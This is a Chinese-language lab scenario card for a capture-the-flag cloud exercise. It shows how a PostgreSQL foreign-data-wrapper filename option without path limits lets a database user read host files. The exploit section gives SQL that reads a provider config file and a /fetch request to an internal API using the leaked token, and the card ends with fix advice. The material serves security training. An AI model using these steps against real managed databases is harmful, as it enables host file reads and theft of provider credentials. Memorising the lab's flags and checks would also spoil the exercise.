# CLOUD-13 RDS log_fdw：托管数据库宿主文件读取

## 场景信息

| 字段 | 值 |
|---|---|
| ID | CLOUD-13 |
| 名称 | RDS log_fdw: Managed DB Host File Read → Provider Internal Creds |
| 技术/CVE | N/A (log_fdw path traversal, case #015) |
| 难度 | L3 |
| 交付方式 | Docker Compose |
| 入口 | localhost:10624 |
| 入口身份 | 宿主侧黑盒起点（无云凭据，需自行派生） |
| 终点 | console + internal-api 经 flag-vault 交付（header-secret：供应商内部凭据（宿主文件里那份）） |

## 场景概述
托管 PostgreSQL 预装了 log_fdw（读数据库日志的扩展），但扩展对
filename 选项没有做路径约束，客户可以把它当任意文件读，跨过
"SQL 授权即边界"的错觉，读到宿主上供应商内部服务凭据。

## 教材锚点
- 案例：AWS RDS PostgreSQL log_fdw 任意文件读（#015）
- 平面：数据面（SQL）→ 失败边界：宿主机 VM
- 六镜头：BOUNDARY（真正的边界是宿主 VM 而非 SQL 授权）；
  IDENTITY（读到的是宿主机上 provider 内部身份）；DETECTION（DB 查询日志
  可见，但宿主文件读取在宿主层不可见）

## 前置知识
- PostgreSQL 扩展机制：CREATE SERVER / CREATE FOREIGN TABLE
- 托管数据库模型：客户拿到数据库角色，永远没有宿主 OS 账号

## 利用步骤

1. 在控制台执行（`file_fdw` 已预置）：
   ```sql
   CREATE SERVER log_server FOREIGN DATA WRAPPER file_fdw;
   CREATE FOREIGN TABLE demo (t text) SERVER log_server
     OPTIONS (filename '/rdsdbdata/config/grover_volume.conf');
   SELECT * FROM demo;
   ```
2. 读出宿主机上的供应商配置文件——里面是**内部凭据**（不再是明文 flag）。控制台（托管引擎）
   随即用这份凭据向 flag-vault 换取第一枚 flag 并补进同一响应。
3. 用同一份内部凭据（`Authorization: Bearer grover-internal-credential-token`）经控制面
   `/fetch` 调内部 API：`/fetch?url=http://internal-api:5000/api&auth=grover-internal-credential-token`，
   换取第二枚 flag。

## Flag

- 位置：`flag-vault` 容器内的 `/vault/flag`（0600 root，容器进程读入内存后即不落盘）。
- 交付条件：只有 console + internal-api 向 flag-vault 出示「供应商内部凭据（宿主文件里那份）」（校验模式 `header-secret`）时才交付；
  其它容器、容器环境变量、落地文件与日志里都没有明文。
- 形态：`flag{cloud-13-<16 位十六进制>}`（验收侧运行时生成，宿主不留副本）。
- 验收：`python3 scripts/validate-cloud-gate.py cloud-13 <flag>`（gate）+
  `python3 tests/cloud/run.py cloud-13 <flag>`（参考利用）。

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | PostgreSQL log_fdw and managed database host files |
| 侦察与前置条件 | Foreign-table log path behavior and provider internal file locations |
| 核心漏洞与利用 | Use log_fdw path traversal/file read |
| 权限、横向或影响 | Provider-internal credential disclosure |
| 验证 | Read the internal credential or flag file |

## 修复建议
FDW 的 filename 必须白名单限制在日志目录；宿主上不允许存放可被
数据库引擎进程读取的供应商内部凭据。
